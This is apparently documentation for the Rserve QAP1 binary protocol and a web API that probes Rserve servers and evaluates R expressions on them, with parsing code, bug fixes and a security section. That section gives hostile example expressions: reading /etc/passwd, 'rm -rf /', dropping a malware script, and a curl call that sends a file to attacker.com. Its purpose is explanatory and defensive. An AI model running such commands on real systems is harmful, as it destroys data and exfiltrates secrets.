# Rserve Protocol — Power-User Documentation

## Overview

**Rserve** is a TCP/IP server that enables remote access to R statistical computing facilities from various programming languages. It uses the QAP1 (Quick Aggregated Protocol version 1) binary protocol for command execution and data exchange.

- **Default Port**: 6311
- **Transport**: TCP (plaintext)
- **Protocol**: QAP1 (binary with ASCII identification header)
- **Encoding**: Binary data with length-prefixed structures
- **Byte Order**: Little-endian (LE) for all multi-byte integers

## Protocol Architecture

### Connection Handshake

When a client connects to Rserve, the server immediately sends a 32-byte ASCII identification string before accepting any commands:

```
┌────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ Magic      │ Version      │ Protocol     │ Attributes   │ Extra Info   │
│ "Rsrv"     │ "0103"       │ "QAP1"       │ "----"       │ Capabilities │
│ 4 bytes    │ 4 bytes      │ 4 bytes      │ 4 bytes      │ 16 bytes     │
└────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
```

**Field Breakdown**:
- **Bytes 0-3**: `Rsrv` (magic identifier — must match exactly)
- **Bytes 4-7**: Protocol version (e.g., `0103` = version 1.3)
- **Bytes 8-11**: Protocol type (always `QAP1`)
- **Bytes 12-15**: Attributes/capabilities (e.g., `----` = none, `ARpt` = auth required plaintext)
- **Bytes 16-31**: Reserved/additional capabilities (may contain `TLS` indicator)

**Authentication Detection**:
- `AR` or `ARpt` in attributes → Plain text password authentication required
- `ARuc` → Encrypted authentication required
- `TLS` anywhere in ID string → TLS support available

### QAP1 Command Structure

After the ID handshake, all client→server communication uses QAP1 command packets:

```
┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ Command      │ Length       │ Offset       │ Length High  │ Payload      │
│ 4 bytes LE   │ 4 bytes LE   │ 4 bytes LE   │ 4 bytes LE   │ variable     │
└──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
```

**Header Fields** (16 bytes total):
- **Command** (uint32 LE): Command type identifier
- **Length** (uint32 LE): Payload byte count (low 32 bits)
- **Offset** (uint32 LE): Reserved (always 0 in standard commands)
- **Length High** (uint32 LE): High 32 bits of payload length (always 0 for payloads < 4 GB)

### QAP1 Response Structure

Server responses use the same 16-byte header format, but the command field has the response bit set:

```
┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
│ Response Cmd │ Length       │ Offset       │ Length High  │ Response     │
│ 4 bytes LE   │ 4 bytes LE   │ 4 bytes LE   │ 4 bytes LE   │ Data         │
└──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
```

**Response Command Codes**:
- `0x10001` (`RESP_OK`) → Success
- `0x10002` (`RESP_ERR`) → Error (error code follows in payload)

Response commands have bit `0x10000` set to distinguish them from client commands.

## Command Reference

### CMD_login (0x001)

Authenticate with username and password.

**Payload**: DT_STRING username + DT_STRING password (both null-terminated, 4-byte aligned)

**Response**:
- `RESP_OK` → Authentication successful
- `RESP_ERR` + error code `0x41` → Authentication failed

### CMD_eval (0x003)

Evaluate an R expression on the server.

**Payload**: DT_STRING containing the R expression (null-terminated, 4-byte aligned)

**Response**:
- `RESP_OK` + DT_SEXP result → Expression evaluated successfully
- `RESP_ERR` + error code → Evaluation failed (syntax error, runtime error, etc.)

**Example Expression**: `R.version.string` returns the R version as a string SEXP.

### CMD_shutdown (0x004)

Request server shutdown (requires admin privileges).

**Payload**: Empty

**Response**: `RESP_OK` or `RESP_ERR`

### CMD_setEncoding (0x008)

Set character encoding for subsequent string operations.

**Payload**: DT_STRING encoding name (e.g., `"utf8"`, `"latin1"`)

**Response**: `RESP_OK` or `RESP_ERR`

## QAP1 Data Types

QAP1 uses type-length-value (TLV) encoding for structured data. Each data element has a 4-byte header:

```
┌──────────────┬──────────────────────────┐
│ Type + Len   │ Data                     │
│ 4 bytes      │ (length bytes)           │
└──────────────┴──────────────────────────┘
```

**Header Format**:
- **Byte 0**: Type code (uint8)
- **Bytes 1-3**: Length (uint24 LE) — does NOT include the 4-byte header itself

### DT_STRING (4)

Null-terminated string, padded to 4-byte boundary.

**Encoding**:
```javascript
const str = "hello";
const encoded = new TextEncoder().encode(str + '\0'); // [0x68,0x65,0x6c,0x6c,0x6f,0x00]
const remainder = encoded.length % 4; // 6 % 4 = 2
const padded = remainder === 0 ? encoded.length : encoded.length + (4 - remainder); // 6 + 2 = 8
const payload = new Uint8Array(4 + padded);

payload[0] = 4;              // DT_STRING
payload[1] = padded & 0xff;  // Length low byte
payload[2] = (padded >> 8) & 0xff;
payload[3] = (padded >> 16) & 0xff;
payload.set(encoded, 4);     // Copy null-terminated string
// Remaining bytes are zero-padded
```

**Wire Format** (example for "hello"):
```
04 08 00 00 68 65 6c 6c 6f 00 00 00
^^          ^^^^^^^^^^^^^^^^^^^^^^^^
Type=4      "hello\0" + 2 padding bytes
   ^^^^^^^^
   Length=8
```

### DT_SEXP (10)

S-expression (R data structure). The 4-byte header is followed by an embedded SEXP structure (see SEXP Encoding below).

**Example**: A DT_SEXP wrapping an integer 42:
```
0A 08 00 00  01 04 00 00  2A 00 00 00
^^          ^^          ^^^^^^^^^^^^
DT_SEXP=10  XT_INT=1    42 (int32 LE)
   ^^^^^^^^    ^^^^^^^^
   Len=8       SEXP hdr (type=1, len=4)
```

## SEXP Encoding (S-Expressions)

R data structures are encoded as SEXPs using a nested TLV format similar to QAP1 data types:

```
┌──────────────┬──────────────────────────┐
│ XT + Len     │ SEXP Data                │
│ 4 or 8 bytes │ (length bytes)           │
└──────────────┴──────────────────────────┘
```

**Header Format (Short — 4 bytes)**:
- **Byte 0**: XT type (lower 6 bits) + flags (upper 2 bits)
  - Bits 0-5: `xtType` (0-63)
  - Bit 6 (`0x40`): `XT_IS_LONG` — use 8-byte header
  - Bit 7 (`0x80`): `XT_HAS_ATTR` — followed by attribute SEXP
- **Bytes 1-3**: Length (uint24 LE)

**Header Format (Long — 8 bytes)**:
- **Byte 0**: XT type + `XT_IS_LONG` flag (0x40)
- **Bytes 1-3**: Reserved (usually 0)
- **Bytes 4-7**: Length (uint32 LE)

**Attribute Handling**:
If `XT_HAS_ATTR` is set, the SEXP data is prefixed by another SEXP containing attributes (e.g., names, class). The data SEXP follows immediately after.

### XT Type Codes

| Code | Name             | Description                                  |
|------|------------------|----------------------------------------------|
| 0    | XT_NULL          | NULL value                                   |
| 1    | XT_INT           | Single 32-bit signed integer                 |
| 2    | XT_DOUBLE        | Single 64-bit IEEE 754 double                |
| 3    | XT_STR_SINGLE    | Single null-terminated string                |
| 16   | XT_VECTOR        | Generic vector (list) of SEXPs               |
| 32   | XT_ARRAY_INT     | Integer array (int32 LE values)              |
| 33   | XT_ARRAY_DOUBLE  | Double array (float64 LE values)             |
| 34   | XT_ARRAY_STR     | String array (null-separated strings)        |
| 36   | XT_ARRAY_BOOL    | Logical array (byte values: 0=FALSE, 1=TRUE) |

**Additional Flags**:
- `0x40` (`XT_IS_LONG`): Use 8-byte header instead of 4-byte
- `0x80` (`XT_HAS_ATTR`): Attribute SEXP precedes data

### SEXP Examples

**XT_NULL (0)**:
```
00 00 00 00
^^
NULL type, length=0
```

**XT_INT (1)** — Single integer 42:
```
01 04 00 00  2A 00 00 00
^^          ^^^^^^^^^^^^
INT type    42 (int32 LE)
   ^^^^^^^^
   Length=4
```

**XT_DOUBLE (2)** — Single double 3.14159:
```
02 08 00 00  6E 86 1B F0 F9 21 09 40
^^          ^^^^^^^^^^^^^^^^^^^^^^^^
DOUBLE      3.14159 (float64 LE)
   ^^^^^^^^
   Length=8
```

**XT_STR_SINGLE (3)** — String "test":
```
03 05 00 00  74 65 73 74 00
^^          ^^^^^^^^^^^^^^^^
STR         "test\0"
   ^^^^^^^^
   Length=5
```

**XT_ARRAY_INT (32)** — Integer vector [1, 2, 3]:
```
20 0C 00 00  01 00 00 00  02 00 00 00  03 00 00 00
^^          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ARRAY_INT   1, 2, 3 (three int32 LE values)
   ^^^^^^^^
   Length=12
```

**XT_ARRAY_DOUBLE (33)** — Double vector [1.0, 2.0]:
```
21 10 00 00  00 00 00 00 00 00 F0 3F  00 00 00 00 00 00 00 40
^^          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
ARRAY_DBL   1.0, 2.0 (two float64 LE values)
   ^^^^^^^^
   Length=16
```

**XT_ARRAY_STR (34)** — String vector ["a", "b", "c"]:
```
22 06 00 00  61 00 62 00 63 00
^^          ^^^^^^^^^^^^^^^^^^^
ARRAY_STR   "a\0b\0c\0"
   ^^^^^^^^
   Length=6
```

**XT_VECTOR (16)** — List containing int 1 and string "x":
```
10 0D 00 00  01 04 00 00 01 00 00 00  03 02 00 00 78 00
^^          ^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^
VECTOR      XT_INT=1, value=1          XT_STR="x\0"
   ^^^^^^^^
   Length=13
```

**XT_ARRAY_BOOL (36)** — Logical vector [TRUE, FALSE, TRUE]:
```
24 03 00 00  01 00 01
^^          ^^^^^^^^^^
ARRAY_BOOL  TRUE, FALSE, TRUE
   ^^^^^^^^
   Length=3
```

## Parsing Algorithm

### Parsing SEXP

```javascript
function parseSEXP(data: Uint8Array, offset: number): { value: SexpValue; consumed: number } {
  if (offset + 4 > data.length) return { value: { type: 'null' }, consumed: 0 };

  const typeRaw = data[offset];
  const xtType = typeRaw & 0x3f;         // Lower 6 bits
  const hasAttr = (typeRaw & 0x80) !== 0; // Bit 7
  const isLong = (typeRaw & 0x40) !== 0;  // Bit 6

  let len: number;
  let headerLen: number;

  if (isLong) {
    len = new DataView(data.buffer, data.byteOffset).getUint32(offset + 4, true);
    headerLen = 8;
  } else {
    len = data[offset + 1] | (data[offset + 2] << 8) | (data[offset + 3] << 16);
    headerLen = 4;
  }

  let dataStart = offset + headerLen;
  const consumed = headerLen + len;

  // Skip attribute SEXP if present
  if (hasAttr) {
    const attr = parseSEXP(data, dataStart);
    if (attr.consumed === 0 || dataStart + attr.consumed > offset + consumed) {
      // Invalid attribute — abort
      return { value: { type: 'null' }, consumed: 0 };
    }
    dataStart += attr.consumed;
  }

  const end = offset + consumed;
  const dv = new DataView(data.buffer, data.byteOffset);

  switch (xtType) {
    case 0: // XT_NULL
      return { value: { type: 'null' }, consumed };

    case 1: // XT_INT
      if (dataStart + 4 > data.length) break;
      return { value: { type: 'integer', values: [dv.getInt32(dataStart, true)] }, consumed };

    case 2: // XT_DOUBLE
      if (dataStart + 8 > data.length) break;
      return { value: { type: 'double', values: [dv.getFloat64(dataStart, true)] }, consumed };

    case 3: // XT_STR_SINGLE
      const nullIdx = data.indexOf(0, dataStart);
      const strEnd = (nullIdx === -1 || nullIdx >= end) ? end : nullIdx;
      return { value: { type: 'string', value: new TextDecoder().decode(data.slice(dataStart, strEnd)) }, consumed };

    case 32: { // XT_ARRAY_INT
      const count = Math.floor((end - dataStart) / 4);
      const values: number[] = [];
      for (let i = 0; i < count; i++) {
        values.push(dv.getInt32(dataStart + i * 4, true));
      }
      return { value: { type: 'integer', values }, consumed };
    }

    case 33: { // XT_ARRAY_DOUBLE
      const count = Math.floor((end - dataStart) / 8);
      const values: number[] = [];
      for (let i = 0; i < count; i++) {
        values.push(dv.getFloat64(dataStart + i * 8, true));
      }
      return { value: { type: 'double', values }, consumed };
    }

    case 34: { // XT_ARRAY_STR
      const values: string[] = [];
      let pos = dataStart;
      while (pos < end) {
        const nullIdx = data.indexOf(0, pos);
        const strEnd = (nullIdx === -1 || nullIdx >= end) ? end : nullIdx;
        if (strEnd > pos) {
          values.push(new TextDecoder().decode(data.slice(pos, strEnd)));
        }
        pos = strEnd + 1;
      }
      return { value: { type: 'strings', values }, consumed };
    }

    case 36: { // XT_ARRAY_BOOL
      const values: boolean[] = [];
      for (let i = dataStart; i < end; i++) {
        values.push(data[i] !== 0);
      }
      return { value: { type: 'logical', values }, consumed };
    }

    case 16: { // XT_VECTOR
      const elements: SexpValue[] = [];
      let pos = dataStart;
      while (pos < end) {
        const child = parseSEXP(data, pos);
        if (child.consumed === 0) break;
        elements.push(child.value);
        pos += child.consumed;
      }
      return { value: { type: 'vector', elements }, consumed };
    }

    default:
      // Unknown type — return raw hex preview
      const slice = data.slice(dataStart, Math.min(end, dataStart + 64));
      const hex = Array.from(slice).map(b => b.toString(16).padStart(2, '0')).join(' ');
      return { value: { type: 'raw', hex }, consumed };
  }

  return { value: { type: 'null' }, consumed };
}
```

### Extracting Result from DT_SEXP

QAP1 responses wrap the result SEXP in a DT_SEXP (type 10) data element:

```javascript
function extractSEXPResult(data: Uint8Array): SexpValue | null {
  let offset = 16; // Skip 16-byte QAP1 response header

  while (offset < data.length - 4) {
    const type = data[offset] & 0x3f;
    let len: number;
    let headerLen: number;

    if ((data[offset] & 0x40) !== 0) {
      // Long form
      len = new DataView(data.buffer, data.byteOffset).getUint32(offset + 4, true);
      headerLen = 8;
    } else {
      // Short form
      len = data[offset + 1] | (data[offset + 2] << 8) | (data[offset + 3] << 16);
      headerLen = 4;
    }

    if (type === 10) { // DT_SEXP
      const inner = parseSEXP(data, offset + headerLen);
      return inner.value;
    }

    offset += headerLen + len;
  }

  return null;
}
```

## API Endpoints

### POST /api/rserve/probe

**Description**: Connect to Rserve and read the server identification string.

**Request Body**:
```json
{
  "host": "rserve.example.com",
  "port": 6311,
  "timeout": 10000
}
```

**Fields**:
- `host` (required): Server hostname or IP address
- `port` (optional, default: 6311): TCP port
- `timeout` (optional, default: 10000, range: 1-300000): Connection timeout in milliseconds

**Success Response**:
```json
{
  "success": true,
  "host": "rserve.example.com",
  "port": 6311,
  "rtt": 45,
  "isRserve": true,
  "magic": "Rsrv",
  "version": "0103",
  "protocolType": "QAP1",
  "attributes": "----",
  "extra": null,
  "requiresAuth": false,
  "supportsTLS": false,
  "bannerBytes": 32,
  "bannerHex": "52 73 72 76 30 31 30 33 51 41 50 31 2d 2d 2d 2d ...",
  "protocol": "Rserve",
  "message": "Rserve 0103 (QAP1) detected in 45ms"
}
```

**Authentication Required Response**:
```json
{
  "success": true,
  "host": "secure.example.com",
  "port": 6311,
  "rtt": 52,
  "isRserve": true,
  "magic": "Rsrv",
  "version": "0103",
  "protocolType": "QAP1",
  "attributes": "ARpt",
  "extra": null,
  "requiresAuth": true,
  "supportsTLS": false,
  "bannerBytes": 32,
  "bannerHex": "52 73 72 76 30 31 30 33 51 41 50 31 41 52 70 74 ...",
  "protocol": "Rserve",
  "message": "Rserve 0103 (QAP1) detected [auth required] in 52ms"
}
```

**No Banner Response** (TCP connected but not Rserve):
```json
{
  "success": true,
  "host": "example.com",
  "port": 6311,
  "rtt": 38,
  "isRserve": false,
  "protocol": "Rserve",
  "message": "TCP connected but no Rserve banner received (38ms)"
}
```

**Error Response**:
```json
{
  "success": false,
  "error": "Connection timeout"
}
```

### POST /api/rserve/eval

**Description**: Evaluate an R expression on the Rserve server (only works if authentication is NOT required).

**Request Body**:
```json
{
  "host": "rserve.example.com",
  "port": 6311,
  "expression": "R.version.string",
  "timeout": 10000
}
```

**Fields**:
- `host` (required): Server hostname or IP address
- `port` (optional, default: 6311): TCP port
- `expression` (optional, default: `"R.version.string"`): R expression to evaluate (max 256 characters)
- `timeout` (optional, default: 10000, range: 1-300000): Connection timeout in milliseconds

**Success Response** (string result):
```json
{
  "success": true,
  "host": "rserve.example.com",
  "port": 6311,
  "rtt": 78,
  "isRserve": true,
  "version": "0103",
  "protocolType": "QAP1",
  "expression": "R.version.string",
  "evalSuccess": true,
  "evalError": null,
  "result": {
    "type": "string",
    "value": "R version 4.3.2 (2023-10-31)"
  },
  "resultString": "R version 4.3.2 (2023-10-31)",
  "responseBytes": 64,
  "responseHex": "01 00 01 00 30 00 00 00 00 00 00 00 00 00 00 00 ...",
  "protocol": "Rserve",
  "message": "Eval OK: R version 4.3.2 (2023-10-31) (78ms)"
}
```

**Success Response** (numeric result):
```json
{
  "success": true,
  "host": "rserve.example.com",
  "port": 6311,
  "rtt": 65,
  "isRserve": true,
  "version": "0103",
  "protocolType": "QAP1",
  "expression": "1 + 1",
  "evalSuccess": true,
  "evalError": null,
  "result": {
    "type": "double",
    "values": [2]
  },
  "resultString": null,
  "responseBytes": 48,
  "responseHex": "01 00 01 00 20 00 00 00 00 00 00 00 00 00 00 00 ...",
  "protocol": "Rserve",
  "message": "Eval OK (binary result, 48 bytes) in 65ms"
}
```

**Success Response** (vector result):
```json
{
  "success": true,
  "host": "rserve.example.com",
  "port": 6311,
  "rtt": 82,
  "isRserve": true,
  "version": "0103",
  "protocolType": "QAP1",
  "expression": "c(1, 2, 3, 4, 5)",
  "evalSuccess": true,
  "evalError": null,
  "result": {
    "type": "double",
    "values": [1, 2, 3, 4, 5]
  },
  "resultString": null,
  "responseBytes": 96,
  "responseHex": "01 00 01 00 50 00 00 00 00 00 00 00 00 00 00 00 ...",
  "protocol": "Rserve",
  "message": "Eval OK (binary result, 96 bytes) in 82ms"
}
```

**Auth Required Response**:
```json
{
  "success": true,
  "host": "secure.example.com",
  "port": 6311,
  "rtt": 52,
  "isRserve": true,
  "version": "0103",
  "requiresAuth": true,
  "protocol": "Rserve",
  "message": "Rserve 0103 requires authentication — cannot evaluate expressions"
}
```

**Not Rserve Response**:
```json
{
  "success": false,
  "error": "Not an Rserve endpoint",
  "bannerHex": "48 54 54 50 2f 31 2e 31 20 34 30 30 20 42 61 64 ..."
}
```

**Error Response**:
```json
{
  "success": false,
  "error": "Connection timeout"
}
```

## Common R Expressions for Probing

| Expression | Purpose | Typical Result Type |
|------------|---------|---------------------|
| `R.version.string` | R version information | String |
| `Sys.info()["sysname"]` | Operating system | String |
| `Sys.info()["release"]` | OS version | String |
| `capabilities()` | R capabilities (JPEG, PNG, X11, etc.) | Named logical vector |
| `installed.packages()[,1]` | List of installed packages | String vector |
| `sessionInfo()` | Full session information | Complex object |
| `.libPaths()` | Library search paths | String vector |
| `getwd()` | Current working directory | String |
| `Sys.getenv("PATH")` | Environment variable | String |
| `memory.limit()` | Memory limit (Windows) | Numeric |
| `memory.size()` | Current memory usage | Numeric |
| `1 + 1` | Basic arithmetic test | Numeric (2) |
| `pi` | Mathematical constant | Numeric (3.14159...) |
| `rnorm(10)` | Random normal samples | Numeric vector |
| `ls()` | List objects in workspace | String vector |

## Error Codes

| Code | Symbol | Description |
|------|--------|-------------|
| 0x41 | ERR_auth_failed | Authentication failed (wrong username/password) |
| 0x42 | ERR_conn_broken | Connection broken (network error, server crash) |
| 0x43 | ERR_inv_cmd | Invalid command code |
| 0x44 | ERR_inv_par | Invalid parameter format |
| 0x45 | ERR_Rerror | R evaluation error (syntax error, runtime error) |
| 0x46 | ERR_IOerror | I/O error (file access, etc.) |
| 0x47 | ERR_notOpen | Object not open |
| 0x48 | ERR_accessDenied | Access denied (insufficient permissions) |
| 0x49 | ERR_unsupportedCmd | Command not supported by server |
| 0x4a | ERR_unknownCmd | Unknown command code |
| 0x4b | ERR_data_overflow | Data overflow (payload too large) |
| 0x4c | ERR_object_too_big | Object too large to serialize |
| 0x4d | ERR_out_of_mem | Server out of memory |
| 0x4e | ERR_ctrl_closed | Control pipe closed |
| 0x4f | ERR_session_busy | Session busy (concurrent request) |
| 0x50 | ERR_detach_failed | Detach failed |

## Security Considerations

### 1. No Encryption

Rserve uses **plaintext TCP** by default. All data, including authentication credentials and R expressions, are transmitted in the clear. This makes Rserve vulnerable to:

- **Password sniffing**: Credentials sent via CMD_login are visible to network observers
- **Command injection**: Expressions can be intercepted and modified
- **Data leakage**: Results may contain sensitive information (API keys, database credentials, etc.)

**Mitigation**:
- Use SSH tunneling: `ssh -L 6311:localhost:6311 rserver`
- Enable TLS if supported (check `supportsTLS` in probe response)
- Restrict access to localhost only (bind Rserve to `127.0.0.1`)
- Use VPN for remote access

### 2. Code Execution

`CMD_eval` allows **arbitrary R code execution** on the server. A malicious expression can:

- **Read files**: `readLines("/etc/passwd")`
- **Write files**: `writeLines(data, "/tmp/malware.sh"); system("chmod +x /tmp/malware.sh")`
- **Execute shell commands**: `system("rm -rf /")`
- **Access databases**: `library(RMySQL); dbConnect(...)`
- **Exfiltrate data**: `system("curl -d @sensitive.csv https://attacker.com")`

**Mitigation**:
- **Authentication**: Always require authentication (`ARpt` or `ARuc` in server config)
- **Sandboxing**: Run Rserve in a restricted container/VM with no network or filesystem access
- **Input validation**: If building a service, whitelist allowed expressions (very difficult to do securely)
- **Monitoring**: Log all CMD_eval requests for audit

### 3. Denial of Service

Unbounded expressions can exhaust server resources:

- **CPU**: `while(TRUE) { rnorm(1e9) }` (infinite loop)
- **Memory**: `x <- rnorm(1e10)` (allocate 80 GB)
- **Disk**: `replicate(1000, write.csv(rnorm(1e6), tempfile()))` (fill disk with temp files)

**Mitigation**:
- Set R memory limits: `Rserve.conf` → `maxmemsize 4096` (4 GB)
- Use OS-level resource limits (cgroups, ulimit)
- Set connection timeout in Rserve config

### 4. Information Disclosure

Error messages and function results may leak sensitive information:

- Server filesystem paths in error messages
- Environment variables containing API keys
- Database connection strings in workspace objects
- Source code from function definitions

**Mitigation**:
- Review all expressions for information disclosure risk
- Sanitize error messages before returning to clients
- Use separate R sessions for sensitive operations

## Implementation Notes

### String Padding Bug (Fixed)

**Original Bug**:
```javascript
const padded = encoded.length + (4 - (encoded.length % 4)) % 4;
// If length=8, this computes: 8 + (4 - 0) % 4 = 8 + 0 = 8 ✓
// If length=5, this computes: 5 + (4 - 1) % 4 = 5 + 3 = 8 ✓
// If length=6, this computes: 6 + (4 - 2) % 4 = 6 + 2 = 8 ✓
// If length=7, this computes: 7 + (4 - 3) % 4 = 7 + 1 = 8 ✓
// Actually correct due to operator precedence, but confusing
```

**Fixed Version**:
```javascript
const remainder = encoded.length % 4;
const padded = remainder === 0 ? encoded.length : encoded.length + (4 - remainder);
// Explicit and clear: add padding only if not already aligned
```

### Resource Leak Prevention

**Timeout Handle Cleanup**: All `setTimeout()` calls now have corresponding `clearTimeout()` in `finally` blocks to prevent memory leaks.

**Lock Release**: Reader/writer locks are released in `finally` blocks with exception suppression to prevent double-throws:

```javascript
try {
  // ... use reader/writer ...
} finally {
  try {
    reader.releaseLock();
  } catch {
    // Ignore - lock may already be released
  }
  try {
    socket.close();
  } catch {
    // Ignore - socket may already be closed
  }
}
```

### Attribute SEXP Bounds Checking

**Bug**: If an attribute SEXP claimed a length that exceeded the parent SEXP's bounds, parsing would read out-of-bounds data.

**Fix**: Validate that `dataStart + attr.consumed <= offset + consumed` before advancing the offset.

### Response Header Redundancy

**Bug**: `cmd: isResponse ? cmd : cmd` (always returns `cmd`)

**Fix**: Removed redundant conditional — just return `cmd`.

## Debugging Tips

### Wireshark Filter

```
tcp.port == 6311
```

**Dissector**: Wireshark does not have a built-in Rserve dissector. Use "Follow TCP Stream" to view raw bytes.

**Identifying Rserve**:
- First packet from server: starts with `52 73 72 76` ("Rsrv")
- Client commands: 16-byte header with command code in first 4 bytes
- Server responses: 16-byte header with `01 00 01 00` (RESP_OK) or `02 00 01 00` (RESP_ERR)

### Common Connection Issues

| Symptom | Cause | Solution |
|---------|-------|----------|
| Connection refused | Rserve not running | Start Rserve: `R CMD Rserve` |
| Connection timeout | Firewall blocking port 6311 | Open port or use SSH tunnel |
| No banner received | Service on port is not Rserve | Check `netstat -tuln | grep 6311` |
| "Not an Rserve endpoint" | Wrong service detected | Verify Rserve is on specified port |
| "Auth required" on eval | Server requires authentication | Use CMD_login before CMD_eval (not implemented here) |

### Testing Locally

**Install Rserve** (R package):
```r
install.packages("Rserve")
```

**Start Server** (no authentication):
```r
library(Rserve)
Rserve(port=6311, args="--vanilla")
```

**Start Server** (with authentication):
Create `/etc/Rserve.conf`:
```
port 6311
auth required
plaintext enable
```

Then:
```r
library(Rserve)
Rserve(port=6311, config.file="/etc/Rserve.conf")
```

**Test with curl**:
```bash
# Probe
curl -X POST https://portofcall.example.com/api/rserve/probe \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost","port":6311}'

# Evaluate expression
curl -X POST https://portofcall.example.com/api/rserve/eval \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost","port":6311,"expression":"R.version.string"}'

# Test arithmetic
curl -X POST https://portofcall.example.com/api/rserve/eval \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost","port":6311,"expression":"sum(1:100)"}'
```

## Known Limitations

1. **No Authentication Support**: CMD_login is not implemented. Servers requiring authentication cannot be accessed.
2. **No TLS Support**: Even if server advertises TLS support, this implementation uses plaintext TCP only.
3. **Read-Only Operations**: Only probe (read ID) and eval (read-only expressions) are implemented. No file upload, workspace modification, or session management.
4. **Single Command Per Connection**: Each endpoint opens a fresh TCP connection, executes one command, and closes. No persistent sessions.
5. **No Streaming Results**: Large results are buffered entirely in memory (64 KB limit in `readResponse()`).
6. **Limited SEXP Types**: Only basic types (NULL, INT, DOUBLE, STRING, VECTOR, arrays) are parsed. Complex types (closures, environments, external pointers) return raw hex.
7. **No Compression**: QAP1 supports gzip/bzip2 compression, but this implementation does not.
8. **No Binary Object Upload**: Cannot send binary data (images, datasets) to Rserve.

## References

- **Rserve Source Code**: https://github.com/s-u/Rserve
- **QAP1 Protocol Specification**: https://www.rforge.net/Rserve/doc.html
- **Rserve Manual**: https://rforge.net/Rserve/files/
- **R Documentation**: https://www.r-project.org/
- **Statistical Computing**: https://www.stat.berkeley.edu/~spector/Rcourse.pdf

## Changelog

- **2026-02-18**: Initial power-user documentation created
- **2026-02-18**: Fixed DT_STRING padding calculation (explicit remainder check)
- **2026-02-18**: Fixed resource leaks (timeout handles, reader/writer locks)
- **2026-02-18**: Fixed redundant conditional in parseQAP1Response
- **2026-02-18**: Added attribute SEXP bounds validation
- **2026-02-18**: Added input validation (empty host, timeout bounds)
- **2026-02-18**: Improved socket cleanup error handling
